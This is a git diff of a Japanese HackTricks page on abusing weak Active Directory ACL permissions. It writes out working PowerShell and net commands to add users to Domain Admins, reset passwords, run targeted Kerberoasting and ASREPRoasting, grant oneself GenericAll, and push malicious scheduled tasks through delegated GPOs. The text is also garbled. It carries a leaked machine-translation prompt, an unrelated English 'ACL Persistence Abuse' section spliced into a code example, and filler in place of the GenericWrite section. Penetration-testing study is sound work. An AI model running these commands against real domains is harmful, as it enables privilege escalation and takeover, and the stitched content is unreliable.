@@ -4,21 +4,29 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**公式のPEASS＆HackTricksのスウェット**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象の範囲を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムを含むテックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 ## コンテキスト
 
-このラボでは、Active DirectoryのDiscretionary Access Control Lists（DACL）およびAccess Control Entries（ACE）の弱い権限を悪用します。
+このラボは、Active DirectoryのDiscretionary Access Control Lists（DACL）およびAccess Control Entries（ACE）の弱い権限を悪用することを目的としています。
 
-ユーザーやグループなどのActive Directoryオブジェクトは、セキュリティ可能なオブジェクトであり、DACL/ACEはそれらのオブジェクトを読み取り/変更できるユーザーを定義します（例：アカウント名の変更、パスワードのリセットなど）。
+ユーザーやグループなどのActive Directoryオブジェクトは、セキュリティ可能なオブジェクトであり、DACL/ACEはそれらのオブジェクトを読み取る/変更することができるユーザーを定義します（アカウント名の変更、パスワードのリセットなど）。
 
-「Domain Admins」セキュリティオブジェクトのACEの例は次のとおりです：
+「Domain Admins」セキュリティ可能なオブジェクトのACEの例は次のとおりです：
 
 ![](../../../.gitbook/assets/1.png)
 
@@ -28,9 +36,9 @@
 * **GenericWrite** - オブジェクトの属性を更新する（ログオンスクリプトなど）
 * **WriteOwner** - オブジェクトの所有者を攻撃者が制御するユーザーに変更し、オブジェクトを乗っ取る
 * **WriteDACL** - オブジェクトのACEを変更し、攻撃者にオブジェクトの完全な制御権を与える
-* **AllExtendedRights** - ユーザーをグループに追加したり、パスワードをリセットする機能
-* **ForceChangePassword** - ユーザーのパスワードを変更する機能
-* **Self (Self-Membership)** - 自分自身をグループに追加する機能
+* **AllExtendedRights** - ユーザーをグループに追加したり、パスワードをリセットする能力
+* **ForceChangePassword** - ユーザーのパスワードを変更する能力
+* **Self（Self-Membership）** - 自分自身をグループに追加する能力
 
 このラボでは、上記のACEのほとんどを探索し、悪用しようとします。
 
@@ -46,7 +54,7 @@ Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRigh
 
 ![](../../../.gitbook/assets/2.png)
 
-*   **パスワードの変更**: 次のコマンドを使用して、そのユーザーのパスワードを変更できます。
+*   **パスワードの変更**: 以下のコマンドを使用して、ユーザーのパスワードを変更できます。
 
 ```bash
 net user <username> <password> /domain
@@ -61,11 +69,11 @@ Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipal
 # SPNのクリーンアップ
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 
-# または、ツールhttps://github.com/ShutdownRepo/targetedKerberoastを使用して、
+# また、ツールhttps://github.com/ShutdownRepo/targetedKerberoastを使用して、
 # 1つまたはすべてのユーザーのハッシュを取得することもできます
 python3 targetedKerberoast.py -domain.local -u <username> -p password -v
 ```
-*   **ターゲット指定のASREPRoasting**: **事前認証**を**無効化**して、ユーザーを**ASREPRoastable**にすることができます。その後、ASREProastを実行します。
+*   **ターゲット指定のASREPRoasting**: ユーザーの**preauthentication**を**無効化**して、ユーザーを**ASREPRoastable**にすることができます。
 
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
@@ -89,9 +97,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
-![](../../../.gitbook/assets/6.gif)
-
-同じことはActive DirectoryまたはPowerSploitモジュールでも実現できます：
+同じことはActive DirectoryまたはPowerSploitモジュールでも実現できます。
 ```csharp
 # with active directory module
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -109,7 +115,7 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 [shadow-credentials.md](shadow-credentials.md)
 {% endcontent-ref %}
 
-## グループへのWriteProperty
+## GroupへのWriteProperty
 
 制御されたユーザーが`Domain Admin`グループの`All`オブジェクトに対して`WriteProperty`権限を持っている場合:
 
@@ -133,11 +139,39 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ## WriteProperty（自己メンバーシップ）
 
-攻撃者が自分自身をグループに追加することを可能にするもう1つの特権です。
+攻撃者が自身をグループに追加することを可能にするもう1つの特権です。
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-![](../../../.gitbook/assets/11.png)
+# ACL Persistence Abuse
+
+## Overview
+
+ACL (Access Control List) Persistence Abuse is a technique used by attackers to maintain persistence on a compromised Windows system by manipulating the permissions of certain files or directories. By modifying the ACLs, an attacker can ensure that their malicious code or backdoor remains undetected and continues to execute even after system reboots or security updates.
+
+## Methodology
+
+1. **Identify target files or directories**: The first step is to identify the files or directories that are suitable for ACL manipulation. These are typically system files or directories that are frequently accessed or executed by the operating system or other applications.
+
+2. **Analyze existing ACLs**: Next, analyze the existing ACLs of the target files or directories to understand the current permissions and access rights. This will help in identifying the specific ACLs that need to be modified.
+
+3. **Modify ACLs**: Modify the ACLs of the target files or directories to grant the necessary permissions to the attacker's code or backdoor. This can be done using various methods, such as using the `icacls` command-line tool or programmatically through scripting.
+
+4. **Test persistence**: Test the persistence by rebooting the system or triggering a security update. Ensure that the attacker's code or backdoor continues to execute without being detected.
+
+5. **Maintain persistence**: To maintain persistence, periodically check and modify the ACLs if necessary. This will ensure that the attacker's code or backdoor remains active even after system changes or updates.
+
+## Mitigation
+
+To mitigate ACL Persistence Abuse, follow these best practices:
+
+- Regularly review and audit the ACLs of critical system files and directories.
+- Restrict permissions to only necessary users and groups.
+- Implement strong password policies to prevent unauthorized access.
+- Monitor system logs and network traffic for any suspicious activity.
+- Keep the operating system and applications up to date with the latest security patches.
+
+By following these practices, you can reduce the risk of ACL Persistence Abuse and enhance the security of your Windows systems.
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
@@ -157,7 +191,7 @@ Set-DomainUserPassword -Identity delegate -Verbose
 ```
 ![](../../../.gitbook/assets/14.png)
 
-パスワードのセキュアな文字列変換をいじる必要がない別の方法:
+パスワードの安全な文字列変換をいじる必要がない別の方法:
 ```csharp
 $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
@@ -201,20 +235,27 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 
 ## ユーザーに対するGenericWrite
 
-Active Directory（AD）のアクセス制御リスト（ACL）は、ユーザーやグループに対して特定のアクションを許可または拒否するために使用されます。GenericWriteは、ユーザーオブジェクトのACLに対して特定の権限を与えることができる一つのアクションです。
+### 概要
 
-この攻撃技術では、攻撃者はユーザーオブジェクトのACLにGenericWrite権限を追加することで、そのユーザーに対して悪意のある操作を行うことができます。具体的には、攻撃者はユーザーオブジェクトの属性を変更したり、他のユーザーに権限を与えたりすることができます。
+この攻撃手法では、Active Directory（AD）のアクセス制御リスト（ACL）の権限を悪用して、ユーザーオブジェクトに対してGenericWrite権限を与えます。GenericWrite権限は、ユーザーオブジェクトの属性を変更するために必要な権限です。この攻撃手法を使用すると、攻撃者はユーザーオブジェクトの属性を変更し、権限を拡大することができます。
 
-この攻撃技術を実行するためには、攻撃者はActive Directoryに対して適切なアクセス権を持っている必要があります。また、攻撃者は攻撃対象のユーザーオブジェクトのDN（Distinguished Name）を知っている必要があります。
+### 攻撃手順
 
-以下の手順に従って、GenericWriteを使用したユーザーへの攻撃を実行することができます。
+1. 攻撃者はActive Directory内のユーザーオブジェクトのACLを調査します。
+2. 攻撃者は、ユーザーオブジェクトのACLに対してGenericWrite権限を追加します。
+3. 攻撃者は、ユーザーオブジェクトの属性を変更し、権限を拡大します。
 
-1. 攻撃者はActive Directoryに対して適切なアクセス権を持っていることを確認します。
-2. 攻撃者は攻撃対象のユーザーオブジェクトのDNを特定します。
-3. 攻撃者は攻撃対象のユーザーオブジェクトのACLを変更し、GenericWrite権限を追加します。
-4. 攻撃者は悪意のある操作を行うために、攻撃対象のユーザーオブジェクトを利用します。
+### 対策方法
 
-この攻撃技術は、Active Directoryのセキュリティを回避するために使用されることがあります。したがって、組織は適切なアクセス制御と監視を実施することが重要です。
+この攻撃手法を防ぐためには、以下の対策を実施することが重要です。
+
+- Active DirectoryのACLを定期的に監査し、不正な変更を検出する。
+- ユーザーオブジェクトのACLに対して適切な権限を設定し、不要な権限を削除する。
+- セキュリティポリシーを適用し、不正な変更を防止する。
+
+### 参考情報
+
+- [Active Directoryのアクセス制御リスト（ACL）](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/access-control/active-directory-acls)
 ```csharp
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
@@ -230,7 +271,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 
 ## グループのGenericWrite
 
-これにより、グループのメンバーとして新しいユーザー（たとえば自分自身）を設定できます：
+これにより、新しいユーザー（例えば、自分自身）をグループのメンバーとして設定できます：
 ```powershell
 # Create creds
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
@@ -242,23 +283,31 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 # Remove group member
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
 ## WriteDACL + WriteOwner
 
-もし、あなたがグループのオーナーである場合、私の場合は`Test` ADグループのオーナーです：
+もし私が`Test` ADグループのオーナーである場合：
 
 ![](../../../.gitbook/assets/22.png)
 
-もちろん、PowerShellを使ってもできます：
+もちろん、PowerShellを使用してもできます：
 ```csharp
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
 ![](../../../.gitbook/assets/23.png)
 
-そして、そのADオブジェクトには `WriteDACL` 権限があります:
+そして、そのADオブジェクトには`WriteDACL`があります:
 
 ![](../../../.gitbook/assets/24.png)
 
-...ADSIの魔法を使って、自分自身に [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) 特権を与えることができます:
+...ADSIの魔法を使って、自分自身に[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)特権を与えることができます:
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -272,7 +321,7 @@ $ADSI.psbase.commitchanges()
 
 これにより、新しいユーザーをグループに追加することができます。
 
-興味深いことに、Active Directoryモジュールと`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの特権を悪用することはできませんでした。
+興味深いことに、Active Directoryモジュールと`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの特権を悪用することはできませんでした：
 ```csharp
 $path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
 $acl = Get-Acl -Path $path
@@ -287,13 +336,13 @@ Set-Acl -Path $path -AclObject $acl
 **DCSync**権限は、ドメイン自体に対して次の権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。\
 [**DCSync攻撃について詳しくはこちらをご覧ください。**](../dcsync.md)
 
-## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>
+## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 時には、特定のユーザー/グループがGroup Policy Objectsを管理するためにアクセスを委任される場合があります。例えば、`offense\spotless`ユーザーの場合です：
 
 ![](../../../.gitbook/assets/a13.png)
 
-PowerViewを利用してこれを確認することができます：
+PowerViewを活用することで、これを確認することができます：
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
@@ -303,11 +352,11 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 
 ### GPOの権限を列挙する <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
-上記のスクリーンショットから、ObjectDNが`New Group Policy Object` GPOを指していることがわかります。なぜなら、ObjectDNが`CN=Policies`を指し、また`CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`もGPOの設定で同じであるからです。以下に示すようにハイライトされています。
+上記のスクリーンショットから、ObjectDNが`CN=Policies`を指し、またGPOの設定でハイライトされている`CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`と同じであるため、上記のObjectDNは`New Group Policy Object` GPOを指していることがわかります。
 
 ![](../../../.gitbook/assets/a15.png)
 
-特定の設定ミスのあるGPOを検索したい場合は、PowerSploitの複数のコマンドレットを連鎖させることができます。
+特定の設定ミスのあるGPOを検索したい場合は、PowerSploitの複数のコマンドレットを以下のように連鎖させることができます。
 ```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
@@ -315,13 +364,13 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityRefere
 
 **指定されたポリシーが適用されたコンピューター**
 
-次に、GPO「Misconfigured Policy」が適用されているコンピューターの名前を解決できます。
+次に、GPO「Misconfigured Policy」が適用されているコンピューター名を解決できます。
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
-**特定のコンピュータに適用されるポリシー**
+![](../../../.gitbook/assets/a17.png)
 
-The following is content from a hacking book about hacking techiques. The following content is from the file /hive/hacktricks/windows-hardening/active-directory-methodology/acl-persistence-abuse/README.md. Translate the relevant English text to Japanese and return the translation keeping excatly the same markdown and html syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
+**特定のコンピュータに適用されるポリシー**
 ```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
@@ -369,16 +418,16 @@ GPOを作成することはできないため、引き続きRSATを使用する�
 ```
 ### ポリシーの強制更新 <a href="#force-policy-update" id="force-policy-update"></a>
 
-前の悪意のある**GPOの更新はおおよそ90分ごとに再読み込み**されます。\
-コンピュータにアクセスできる場合は、`gpupdate /force`で強制的に更新することができます。
+前回の乱用された **GPOの更新はおおよそ90分ごとに再読み込み** されます。\
+コンピュータにアクセスできる場合は、`gpupdate /force` で強制的に更新することができます。
 
 ### 内部構造 <a href="#under-the-hood" id="under-the-hood"></a>
 
-`Misconfigured Policy` GPOのスケジュールされたタスクを観察すると、`evilTask`がそこに存在していることがわかります:
+`Misconfigured Policy` GPOのスケジュールされたタスクを観察すると、`evilTask` がそこに存在していることがわかります:
 
 ![](../../../.gitbook/assets/a22.png)
 
-以下は、GPO内の悪意のあるスケジュールされたタスクを表す`New-GPOImmediateTask`によって作成されたXMLファイルです:
+以下は、GPO内の私たちの邪悪なスケジュールされたタスクを表す `New-GPOImmediateTask` によって作成されたXMLファイルです:
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
@@ -443,7 +492,7 @@ GPOを作成することはできないため、引き続きRSATを使用する�
 
 ### ユーザーとグループ <a href="#users-and-groups" id="users-and-groups"></a>
 
-同じ特権昇格は、GPOのユーザーとグループ機能を悪用することで達成することができます。以下のファイルの6行目に注目してください。ここでは、ユーザー`spotless`がローカルの`administrators`グループに追加されています。ユーザーを他のものに変更したり、別のユーザーを追加したり、ユーザーを別のグループ/複数のグループに追加したりすることができます。なぜなら、GPOの委任が私たちのユーザー`spotless`に割り当てられているため、表示される場所のポリシー設定ファイルを変更できるからです。
+同じ特権昇格は、GPOのユーザーとグループ機能を悪用することで達成することができます。以下のファイルの6行目に注目してください。ここでは、ユーザー`spotless`がローカルの`administrators`グループに追加されています。私たちはユーザーを他のものに変更したり、別のユーザーを追加したり、ユーザーを別のグループ/複数のグループに追加したりすることができます。なぜなら、GPOの委任が私たちのユーザー`spotless`に割り当てられているため、表示される場所のポリシー設定ファイルを変更することができるからです。
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
@@ -460,7 +509,7 @@ GPOを作成することはできないため、引き続きRSATを使用する�
 ```
 {% endcode %}
 
-さらに、ログオン/ログオフスクリプトを利用したり、レジストリを使用して自動実行を行ったり、.msiをインストールしたり、サービスを編集したりすることも考えられます。
+さらに、ログオン/ログオフスクリプトを活用したり、レジストリを使用して自動実行を行ったり、.msiをインストールしたり、サービスを編集したりすることも考えられます。
 
 ## 参考文献
 
@@ -471,14 +520,21 @@ GPOを作成することはできないため、引き続きRSATを使用する�
 * [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
 * [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)
 
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+最も重要な脆弱性を見つけて、より迅速に修正できます。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、テックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
 * **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
 
 </details>
